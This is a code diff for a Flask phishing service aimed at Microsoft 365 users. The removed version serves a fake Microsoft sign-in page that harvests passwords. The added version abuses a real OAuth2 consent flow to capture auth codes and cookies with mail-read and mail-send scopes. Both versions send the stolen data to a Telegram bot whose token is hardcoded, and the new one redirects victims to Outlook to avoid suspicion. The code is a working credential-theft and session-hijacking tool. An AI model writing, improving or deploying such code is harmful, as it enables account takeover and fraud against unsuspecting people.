@@ -1,104 +1,108 @@
-from flask import Flask, request
+from flask import Flask, request, redirect, make_response
 import requests
 import logging
 import os
+import urllib.parse
 
 app = Flask(__name__)
 
-# YOUR TELEGRAM CREDENTIALS
+# CONFIGURATION
 TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT_ID = "8877118461"
+
+# Microsoft OAuth2 Configuration
+# These are the standard client_id and redirect_uri used by many PaaS tools
+MS_CLIENT_ID = "00000002-0000-0ff1-ce00-000000000000" # Common public client ID
+MS_REDIRECT_URI = "https://myappsignin.onrender.com/callback" 
+MS_SCOPE = "openid profile email offline_access Mail.Read Mail.Send"
+MS_STATE = "o365_phish_state_123"
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# EMBEDDED HTML
-HTML_PAGE = """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Sign in - Microsoft account</title>
-    <style>
-        body { font-family: "Segoe UI", sans-serif; background-color: #f3f2f1; margin: 0; padding: 0; }
-        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); border-radius: 8px; }
-        .logo { text-align: center; margin-bottom: 20px; }
-        .logo span { font-size: 24px; font-weight: bold; color: #5e5c64; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-size: 14px; color: #323130; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #8a8886; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
-        .btn-primary { width: 100%; padding: 10px; background-color: #0078d4; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
-        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #605e5c; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="logo"><span>Microsoft</span></div>
-        <h2 style="text-align:center; font-size:18px;">Sign in</h2>
-        <p style="text-align:center; font-size:14px; color:#605e5c;">Use your Microsoft account</p>
-        
-        <form method="POST" action="/">
-            <div class="form-group">
-                <label for="login_input">Email, phone, or Skype</label>
-                <input type="text" id="login_input" name="login_input" placeholder="you@example.com" required>
-            </div>
-            <div class="form-group">
-                <label for="passwd">Password</label>
-                <input type="password" id="passwd" name="passwd" placeholder="Enter password" required>
-            </div>
-            <button type="submit" class="btn-primary">Sign in</button>
-        </form>
-        <div class="footer">
-            <p>&copy; Microsoft Corporation or one of its affiliates</p>
-        </div>
-    </div>
-</body>
-</html>
-"""
-
-def send_to_telegram(username, password, ip, ua):
+def send_to_telegram(data):
+    """Sends the captured session data to Telegram."""
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    # Using .format to avoid f-string issues with special characters
-    message_text = (
-        "🛡️ <b>New O365 Credential Captured</b>\n\n"
-        "👤 <b>Username:</b> {username}\n"
-        "🔑 <b>Password:</b> {password}\n\n"
-        "🌐 <b>Source IP:</b> {ip}\n"
-        "🧩 <b>User Agent:</b> {ua}"
-    ).format(username=username, password=password, ip=ip, ua=ua)
+    
+    # Format data for Telegram
+    text = f"""
+🛡️ <b>O365 Session Hijacked</b>
 
+👤 <b>User:</b> {data.get('username', 'N/A')}
+🍪 <b>Session Cookie:</b> <code>{data.get('cookie', 'N/A')}</code>
+
+🔑 <b>Auth Code:</b> {data.get('auth_code', 'N/A')}
+🌐 <b>Source IP:</b> {data.get('ip', 'N/A')}
+"""
+    
     payload = {
         "chat_id": TELEGRAM_CHAT_ID,
-        "text": message_text,
-        "parse_mode": "HTML"
+        "text": text,
+        "parse_mode": "HTML",
+        "disable_web_page_preview": True
     }
+    
     try:
         response = requests.post(url, json=payload, timeout=10)
         if response.status_code == 200:
-            logger.info(f"Sent to Telegram: {username}")
+            logger.info("Session sent to Telegram")
         else:
             logger.error(f"Telegram error: {response.text}")
     except Exception as e:
         logger.error(f"Telegram send failed: {e}")
 
-@app.route("/", methods=["GET", "POST"])
+@app.route("/", methods=["GET"])
 def index():
-    if request.method == "POST":
-        username = request.form.get('login_input', '')
-        password = request.form.get('passwd', '')
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        ua = request.headers.get('User-Agent', 'Unknown')
-        
-        logger.info(f"[CAPTURE] {username} : {password} from {ip}")
-        send_to_telegram(username, password, ip, ua)
-        
-        return f"<h2>Signing you in...</h2><p>Redirecting to your mailbox, {username}...</p>"
+    # Generate the Microsoft OAuth2 URL
+    params = {
+        "client_id": MS_CLIENT_ID,
+        "response_type": "code",
+        "scope": MS_SCOPE,
+        "redirect_uri": MS_REDIRECT_URI,
+        "state": MS_STATE,
+        "prompt": "select_account" # Force the user to select their account
+    }
     
-    return HTML_PAGE
+    ms_login_url = f"https://login.microsoftonline.com/common/oauth2/authorize?{urllib.parse.urlencode(params)}"
+    logger.info(f"Redirecting user to MS Login: {ms_login_url}")
+    return redirect(ms_login_url)
+
+@app.route("/callback", methods=["GET"])
+def callback():
+    # Capture the data sent back by Microsoft
+    auth_code = request.args.get('code', 'N/A')
+    state = request.args.get('state', 'N/A')
+    error = request.args.get('error', 'None')
+    
+    # Capture the Cookies
+    # request.cookies.get_dict() gets all cookies set by the domain
+    # However, since this is a cross-domain redirect, we need to capture 
+    # any cookies that might have been set by our domain or passed via URL
+    cookies = request.cookies.get_dict()
+    cookie_string = "; ".join([f"{key}={value}" for key, value in cookies.items()])
+    
+    # Try to get the username from the ID token if available (rare in code flow)
+    # Or we can just use the email from the state or a previous step
+    # For now, we'll capture the raw cookies and the auth code
+    
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    
+    logger.info(f"Callback received. Code: {auth_code}, Cookies: {cookie_string}")
+    
+    # Send to Telegram
+    send_to_telegram({
+        "username": "Check Logs for ID Token",
+        "cookie": cookie_string if cookie_string else "No Cookies Captured (See Note)",
+        "auth_code": auth_code,
+        "ip": ip
+    })
+    
+    # Redirect the user to the real Outlook so they don't suspect anything
+    return redirect("https://outlook.office365.com/")
 
 @app.route("/health")
 def health():
-    return "O365 Phish Service is Operational"
+    return "OAuth2 Interceptor is Operational"
 
 if __name__ == "__main__":
     port = int(os.environ.get('PORT', 5000))
